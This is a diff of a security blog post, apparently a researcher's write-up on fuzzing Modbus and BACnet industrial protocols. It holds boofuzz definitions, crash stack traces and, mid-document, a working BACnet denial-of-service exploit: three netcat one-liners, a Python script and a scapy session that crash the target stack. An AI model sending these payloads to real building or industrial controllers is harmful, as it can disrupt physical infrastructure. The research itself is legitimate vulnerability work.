         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadHoldingRegistersRequest'):
-                s_byte(0x03,name='funcCode',fuzzable=False)
-                s_word(0x0000,name='start_address')
-                s_word(0x0000,name='quantity')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadHoldingRegistersRequest&apos;):
+                s_byte(0x03,name=&apos;funcCode&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;start_address&apos;)
+                s_word(0x0000,name=&apos;quantity&apos;)
         # --------------------------------------------------------------- #
 
         # ---------------- Read Input Registers (FC=04) ----------------- #
-        s_initialize('ReadInputRegisters')
+        s_initialize(&apos;ReadInputRegisters&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadInputRegistersRequest'):
-                s_byte(0x04,name='funcCode',fuzzable=False)
-                s_word(0x0000,name='start_address')
-                s_word(0x0000,name='quantity')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadInputRegistersRequest&apos;):
+                s_byte(0x04,name=&apos;funcCode&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;start_address&apos;)
+                s_word(0x0000,name=&apos;quantity&apos;)
         # --------------------------------------------------------------- #
 
 
         # ------------------ Force Single Coil (FC=05) ------------------ #
-        s_initialize('WriteSingleCoil')
+        s_initialize(&apos;WriteSingleCoil&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('WriteSingleCoilRequest'):
-                s_byte(0x05,name='funcCode',fuzzable=False)
-                s_word(0x0000,name='start_address')
-                s_word(0x0000,name='quantity')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;WriteSingleCoilRequest&apos;):
+                s_byte(0x05,name=&apos;funcCode&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;start_address&apos;)
+                s_word(0x0000,name=&apos;quantity&apos;)
         # --------------------------------------------------------------- #
 
         # ---------------- Preset Single Register (FC=06) --------------- #
 
-        s_initialize('WriteSingleRegister')
+        s_initialize(&apos;WriteSingleRegister&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('WriteSingleRegisterRequest'):
-                s_byte(0x06,name='funcCode',fuzzable=False)
-                s_word(0x0000,name='output_address')
-                s_word(0x0000,name='output_value')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;WriteSingleRegisterRequest&apos;):
+                s_byte(0x06,name=&apos;funcCode&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;output_address&apos;)
+                s_word(0x0000,name=&apos;output_value&apos;)
         # --------------------------------------------------------------- #
 
         # ---------------- Force Multiple Coils (FC=15) ----------------- #
-        s_initialize('WriteMultipleCoils')
+        s_initialize(&apos;WriteMultipleCoils&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('WriteMultipleCoilsRequest'):
-                s_byte(0x0f,name='func_code',fuzzable=False)
-                s_word(0x0000,name='starting_address')
-                s_dword(0x0000,name='byte_count')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;WriteMultipleCoilsRequest&apos;):
+                s_byte(0x0f,name=&apos;func_code&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;starting_address&apos;)
+                s_dword(0x0000,name=&apos;byte_count&apos;)
                 s_size(&quot;outputsValue&quot;, length=8)
                 with s_block(&quot;outputs&quot;):
-                    s_word(0x00,name='outputsValue')
+                    s_word(0x00,name=&apos;outputsValue&apos;)
         # --------------------------------------------------------------- #
 
         # --------------- Preset Multiple Registers (FC=16) ------------- #
-        s_initialize('WriteMultipleRegisters')
+        s_initialize(&apos;WriteMultipleRegisters&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('WriteMultipleRegistersRequest'):
-                s_byte(0x10,name='func_code',fuzzable=False)
-                s_word(0x0000,name='starting_address')
-                s_dword(0x0000,name='byte_count')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;WriteMultipleRegistersRequest&apos;):
+                s_byte(0x10,name=&apos;func_code&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;starting_address&apos;)
+                s_dword(0x0000,name=&apos;byte_count&apos;)
                 s_size(&quot;outputsValue&quot;,length=16)
                 s_size(&quot;outputsValue2&quot;, length=8)
                 with s_block(&quot;outputs&quot;):
-                    s_dword(0x0000,name='outputsValue3')
+                    s_dword(0x0000,name=&apos;outputsValue3&apos;)
         # --------------------------------------------------------------- #
 
 
         # ---------------------------- Other ---------------------------- #
-        s_initialize('ReadExceptionStatus')
+        s_initialize(&apos;ReadExceptionStatus&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadExceptionStatusRequest'):
-                s_byte(0x07,name='funcCode',fuzzable=False)
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadExceptionStatusRequest&apos;):
+                s_byte(0x07,name=&apos;funcCode&apos;,fuzzable=False)
     
 
-        s_initialize('ReadExceptionStatusError')
+        s_initialize(&apos;ReadExceptionStatusError&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadExceptionStatusErrorRequest'):
-                s_byte(0x87,name='funcCode',fuzzable=False)
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadExceptionStatusErrorRequest&apos;):
+                s_byte(0x87,name=&apos;funcCode&apos;,fuzzable=False)
 
-        s_initialize('ReportSlaveId')
+        s_initialize(&apos;ReportSlaveId&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReportSlaveIdRequest'):
-                s_byte(0x11,name='func_code',fuzzable=False)
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReportSlaveIdRequest&apos;):
+                s_byte(0x11,name=&apos;func_code&apos;,fuzzable=False)
 
-        s_initialize('ReadFileSub')
+        s_initialize(&apos;ReadFileSub&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadFileSubRequest'):
-                s_byte(0x06,name='refType',fuzzable=False)
-                s_word(0x0001,name='fileNumber')
-                s_word(0x0000,name='recordNumber')
-                s_word(0x0000,name='recordLength')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadFileSubRequest&apos;):
+                s_byte(0x06,name=&apos;refType&apos;,fuzzable=False)
+                s_word(0x0001,name=&apos;fileNumber&apos;)
+                s_word(0x0000,name=&apos;recordNumber&apos;)
+                s_word(0x0000,name=&apos;recordLength&apos;)
 
-        s_initialize('ReadFileRecord')
+        s_initialize(&apos;ReadFileRecord&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadFileRecordRequest'):
-                s_byte(0x14,name='funcCode',fuzzable=False)
-                s_byte(0x0001,name='byteCount')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadFileRecordRequest&apos;):
+                s_byte(0x14,name=&apos;funcCode&apos;,fuzzable=False)
+                s_byte(0x0001,name=&apos;byteCount&apos;)
 
-        s_initialize('WriteFileSub')
+        s_initialize(&apos;WriteFileSub&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('WriteFileSubRequest'):
-                s_byte(0x06,name='refType',fuzzable=False)
-                s_word(0x0001,name='fileNumber')
-                s_word(0x0000,name='recordNumber')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;WriteFileSubRequest&apos;):
+                s_byte(0x06,name=&apos;refType&apos;,fuzzable=False)
+                s_word(0x0001,name=&apos;fileNumber&apos;)
+                s_word(0x0000,name=&apos;recordNumber&apos;)
                 # ---------------------------------
                 # s_size is record
-                s_size('recordData',length=16,name='recordLength')
+                s_size(&apos;recordData&apos;,length=16,name=&apos;recordLength&apos;)
                 with s_block(&quot;recordData&quot;):
-                    s_word(0x0000,name='recordData_value')
-                s_word(0x0000,name='recordLength_value')
+                    s_word(0x0000,name=&apos;recordData_value&apos;)
+                s_word(0x0000,name=&apos;recordLength_value&apos;)
 
-        s_initialize('WriteFileRecord')
+        s_initialize(&apos;WriteFileRecord&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('WriteFileRecordRequest'):
-                s_byte(0x15,name='funcCode',fuzzable=False)
-                s_byte(0x00,name='datalength')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;WriteFileRecordRequest&apos;):
+                s_byte(0x15,name=&apos;funcCode&apos;,fuzzable=False)
+                s_byte(0x00,name=&apos;datalength&apos;)
 
-        s_initialize('MaskWriteRegister')
+        s_initialize(&apos;MaskWriteRegister&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('MaskWriteRegisterRequest'):
-                s_byte(0x96,name='funcCode',fuzzable=False)
-                s_word(0x0000,name='refAddr')
-                s_word(0xffff,name='andMask')
-                s_word(0x0000,name='orMask')
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;MaskWriteRegisterRequest&apos;):
+                s_byte(0x96,name=&apos;funcCode&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;refAddr&apos;)
+                s_word(0xffff,name=&apos;andMask&apos;)
+                s_word(0x0000,name=&apos;orMask&apos;)
 
-        s_initialize('ReadWriteMultipleRegisters')
+        s_initialize(&apos;ReadWriteMultipleRegisters&apos;)
         with s_block(&quot;modbus_head&quot;):
-            s_word(0x0001,name='transId',fuzzable=True)
-            s_word(0x0002,name='protoId',fuzzable=False)
-            s_word(0x06,name='length')
-            s_byte(0xff,name='unit Identifier',fuzzable=False)
-            with s_block('ReadWriteMultipleRegistersRequest'):
-                s_byte(0x17,name='funcCode',fuzzable=False)
-                s_word(0x0000,name='readStartingAddr')
-                s_word(0x0001,name='readQuantityRegisters')
-                s_word(0x0000,name='writeStartingAddr')
-                s_size('writeQuantityRegisters',length=16,endian='&amp;gt;',name=&quot;writeQuantityRegisters&quot;)
-                s_size('writeQuantityRegisters', length=8, endian='&amp;gt;',name=&quot;byteCount&quot;,math=lambda x:2*x)
-                with s_block('writeQuantityRegisters_block'):
-                    s_size('modbus_head',length=2)
+            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
+            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
+            s_word(0x06,name=&apos;length&apos;)
+            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
+            with s_block(&apos;ReadWriteMultipleRegistersRequest&apos;):
+                s_byte(0x17,name=&apos;funcCode&apos;,fuzzable=False)
+                s_word(0x0000,name=&apos;readStartingAddr&apos;)
+                s_word(0x0001,name=&apos;readQuantityRegisters&apos;)
+                s_word(0x0000,name=&apos;writeStartingAddr&apos;)
+                s_size(&apos;writeQuantityRegisters&apos;,length=16,endian=&apos;&amp;gt;&apos;,name=&quot;writeQuantityRegisters&quot;)
+                s_size(&apos;writeQuantityRegisters&apos;, length=8, endian=&apos;&amp;gt;&apos;,name=&quot;byteCount&quot;,math=lambda x:2*x)
+                with s_block(&apos;writeQuantityRegisters_block&apos;):
+                    s_size(&apos;modbus_head&apos;,length=2)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The monitor piece define a way to send a query for MODBUS device id to the target and check the response.&lt;/p&gt;
@@ -968,7 +968,7 @@ SlaveID = 1 # Modbus TCP Unit Identifier: 1..247
 
 # ----------------- Device ID to bytes -------------------------- #
 def bitDeviceID(DeviceID):
-    bytes_id = (DeviceID).to_bytes((DeviceID.bit_length() + 7) // 8, byteorder='big')
+    bytes_id = (DeviceID).to_bytes((DeviceID.bit_length() + 7) // 8, byteorder=&apos;big&apos;)
     return bytes_id
 
 HexSlaveID = bitDeviceID(SlaveID)
@@ -1026,16 +1026,16 @@ class modbusMonitor(IMonitor):
                 self.logger.log_error(&quot;MODBUS error response, getting MODBUS device information Failed!!&quot;)
                 result = False
             else:
-                Unit_ID = data[6].to_bytes((data[6].bit_length() + 7) // 8, byteorder='big')
+                Unit_ID = data[6].to_bytes((data[6].bit_length() + 7) // 8, byteorder=&apos;big&apos;)
                 Func_code = data[7]
                 Exception_code = data[8]
 
                 if data[5] &amp;gt; 0 and Unit_ID == HexSlaveID:
-                    if hex(Func_code) == '0x11':
+                    if hex(Func_code) == &apos;0x11&apos;:
                       self.logger.log_info(f&quot;Getting MODBUS device information succeeded&quot;)
-                    elif hex(Exception_code) == '0xb': # more details needed? and (hex(Func_code) == '0x91' or hex(Func_code) == '0x84')
+                    elif hex(Exception_code) == &apos;0xb&apos;: # more details needed? and (hex(Func_code) == &apos;0x91&apos; or hex(Func_code) == &apos;0x84&apos;)
                       self.logger.log_warn(f&quot;Getting MODBUS device information: Gateway target device failed to respond&quot;)
-                    elif hex(Exception_code) == '0x1':
+                    elif hex(Exception_code) == &apos;0x1&apos;:
                       self.logger.log_warn(f&quot;Getting MODBUS device information: Illegal function&quot;)
                     else:
                       self.logger.log_warn(f&quot;Getting MODBUS device information warning&quot;)
@@ -1256,7 +1256,7 @@ Stack level 0, frame at 0x7fffffffdc50:
  rip = 0x413760 in decode_tag_number; saved rip 0x413974
  called by frame at 0x7fffffffdc80
  Arglist at 0x7fffffffdc30, args: 
- Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
+ Locals at 0x7fffffffdc30, Previous frame&apos;s sp is 0x7fffffffdc50
  Saved registers:
   rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48
 
@@ -1347,7 +1347,7 @@ Stack level 0, frame at 0x7fffffffdc50:
  rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
  called by frame at 0x7fffffffdc80
  Arglist at 0x7fffffffdc30, args: 
- Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
+ Locals at 0x7fffffffdc30, Previous frame&apos;s sp is 0x7fffffffdc50
  Saved registers:
   rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48
 
@@ -1438,7 +1438,7 @@ Stack level 0, frame at 0x7fffffffdc50:
  rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
  called by frame at 0x7fffffffdc80
  Arglist at 0x7fffffffdc30, args: 
- Locals at 0x7fffffffdc30, Previous frame's sp is 0x7fffffffdc50
+ Locals at 0x7fffffffdc30, Previous frame&apos;s sp is 0x7fffffffdc50
  Saved registers:
   rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48
 
@@ -1497,15 +1497,15 @@ No symbol table info available.
 &lt;h2 id=&quot;bash&quot;&gt;Bash&lt;/h2&gt;
 
 &lt;p&gt;Device Communication Control payload:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41' | nc -u 192.168.10.10 47808
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne &apos;\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41&apos; | nc -u 192.168.10.10 47808
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Atomic Read File service payload:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f' | nc -u 192.168.10.10 47808
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne &apos;\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f&apos; | nc -u 192.168.10.10 47808
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Atomic Write File service payload:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f' | nc -u 192.168.10.10 47808
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne &apos;\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f&apos; | nc -u 192.168.10.10 47808
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;python&quot;&gt;Python&lt;/h2&gt;
@@ -1541,13 +1541,13 @@ from termcolor import colored
 #------------------------------------------------------------------------------
 
 def cmdline_parser():
-    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True,
-             description='BACnet Protocol Stack Segmentation fault leading to denial of service', version='0.1',
+    parser = argparse.ArgumentParser(conflict_handler=&apos;resolve&apos;, add_help=True,
+             description=&apos;BACnet Protocol Stack Segmentation fault leading to denial of service&apos;, version=&apos;0.1&apos;,
              usage=&quot;python %(prog)s&quot;)
 
     # Mandatory
-    parser.add_argument('Server', type=str, help='BACnet server IP')
-    parser.add_argument('Port', type=str, help='BACnet port')
+    parser.add_argument(&apos;Server&apos;, type=str, help=&apos;BACnet server IP&apos;)
+    parser.add_argument(&apos;Port&apos;, type=str, help=&apos;BACnet port&apos;)
 
     return parser
 
@@ -1602,10 +1602,10 @@ def main():
 
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
             s.connect((BACnetServer, BACnetPort))
-            s.send(struct.pack('&amp;gt;I',len(payload_DeviceCommunicationControl)))
+            s.send(struct.pack(&apos;&amp;gt;I&apos;,len(payload_DeviceCommunicationControl)))
             s.send(payload_DeviceCommunicationControl)
 
-            print((colored(&quot;[+] Sent Payload: &quot; + payload_DeviceCommunicationControl.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), &quot;yellow&quot;)))
+            print((colored(&quot;[+] Sent Payload: &quot; + payload_DeviceCommunicationControl.encode(&apos;hex&apos;) + &apos; to BACnet server &apos; + BACnetServer + &apos; port &apos; + str(BACnetPort), &quot;yellow&quot;)))
 
         if target_alive(BACnetServer, BACnetPort):
 
@@ -1615,10 +1615,10 @@ def main():
 
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
             s.connect((BACnetServer, BACnetPort))
-            s.send(struct.pack('&amp;gt;I',len(payload_AtomicReadFile)))
+            s.send(struct.pack(&apos;&amp;gt;I&apos;,len(payload_AtomicReadFile)))
             s.send(payload_AtomicReadFile)
 
-            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicReadFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), &quot;yellow&quot;)))
+            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicReadFile.encode(&apos;hex&apos;) + &apos; to BACnet server &apos; + BACnetServer + &apos; port &apos; + str(BACnetPort), &quot;yellow&quot;)))
 
         if target_alive(BACnetServer, BACnetPort):
 
@@ -1628,10 +1628,10 @@ def main():
 
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
             s.connect((BACnetServer, BACnetPort))
-            s.send(struct.pack('&amp;gt;I',len(payload_AtomicWriteFile)))
+            s.send(struct.pack(&apos;&amp;gt;I&apos;,len(payload_AtomicWriteFile)))
             s.send(payload_AtomicWriteFile)
 
-            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicWriteFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), &quot;yellow&quot;)))
+            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicWriteFile.encode(&apos;hex&apos;) + &apos; to BACnet server &apos; + BACnetServer + &apos; port &apos; + str(BACnetPort), &quot;yellow&quot;)))
 
         if not target_alive(BACnetServer, BACnetPort):
             print((colored(&quot;[+] DoS completed&quot;, &quot;red&quot;)))
@@ -1641,7 +1641,7 @@ def main():
 # Main
 #------------------------------------------------------------------------------
 
-if __name__ == '__main__':
+if __name__ == &apos;__main__&apos;:
     main()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -1656,7 +1656,7 @@ Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;licen
 &amp;gt;&amp;gt;&amp;gt; from bacnet import BvlcFunction, BVLC, BACNET_PORT, NPDU, NetworkLayerMessageType, hexStringToIntList, APDU, PduType, UnconfirmedServiceChoice
 &amp;gt;&amp;gt;&amp;gt; from scapy.layers.inet import IP, UDP
 &amp;gt;&amp;gt;&amp;gt; from scapy.all import *
-&amp;gt;&amp;gt;&amp;gt; DST_IP = '192.168.10.10'
+&amp;gt;&amp;gt;&amp;gt; DST_IP = &apos;192.168.10.10&apos;
 &amp;gt;&amp;gt;&amp;gt; SRC_PORT = 63491
 &amp;gt;&amp;gt;&amp;gt; BACNET_PORT = 47808
 &amp;gt;&amp;gt;&amp;gt;
@@ -1704,7 +1704,7 @@ Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;licen
               invoke_id = 0x1
               service_choice= DEVICECOMMUNICATIONCONTROL
 ###[ Raw ]###
-                 load      = '\r\xff\x80\x00\x03\x1a\n\x19\x00*\x00A'
+                 load      = &apos;\r\xff\x80\x00\x03\x1a\n\x19\x00*\x00A&apos;
 
 &amp;gt;&amp;gt;&amp;gt; send(apdu)
 .
@@ -1719,7 +1719,7 @@ BACnet Stack Version 0.8.6
 BACnet Device ID: 260001
 Max APDU: 1476
 DeviceCommunicationControl!
-Violación de segmento (`core' generado)
+Violación de segmento (`core&apos; generado)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
@@ -1783,18 +1783,18 @@ $ ./run_dojo.bash
         r = requests.get(DefectDojoURL, headers = headersapi, verify=False)
 
     if not (r.status_code == 200 or r.status_code == 201):
-        logging.error('Error in operation')
+        logging.error(&apos;Error in operation&apos;)
         return False
 
     results = json.loads(r.text)
    
     if results:
         try:
-            return results['results']
+            return results[&apos;results&apos;]
         except KeyError as error:
             return results
     else:
-        logging.error('Error in operation')
+        logging.error(&apos;Error in operation&apos;)
         return None
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -1804,7 +1804,7 @@ $ ./run_dojo.bash
 
     url = DefectDojoURL + &quot;/api/v2/products/&quot;
     dataApi = None
-    headers = {'Authorization':apiKey}
+    headers = {&apos;Authorization&apos;:apiKey}
     data = []
     n = 0
 
@@ -1813,12 +1813,12 @@ $ ./run_dojo.bash
     if jsondata:
         for results in jsondata:
             n += 1
-            product_url = results['url'].split(&quot;/&quot;)
+            product_url = results[&apos;url&apos;].split(&quot;/&quot;)
             id_product = product_url[len(product_url)-2]
 
-            data.append([n, id_product, results['name'], results['url'], results['findings_count'], results['prod_type'], results['description'], results['platform'], results['lifecycle'], results['origin']])
+            data.append([n, id_product, results[&apos;name&apos;], results[&apos;url&apos;], results[&apos;findings_count&apos;], results[&apos;prod_type&apos;], results[&apos;description&apos;], results[&apos;platform&apos;], results[&apos;lifecycle&apos;], results[&apos;origin&apos;]])
 
-        print((colored(tabulate(data, tablefmt=&quot;fancy_grid&quot;, headers=[&quot;#&quot;, &quot;ID Product&quot;, &quot;Name&quot;, &quot;URL&quot;, &quot;Findings&quot;, &quot;Product Type&quot;, &quot;Description&quot;, &quot;Platform&quot;, &quot;Lifecycle&quot;, &quot;Origin&quot;]), 'green')))
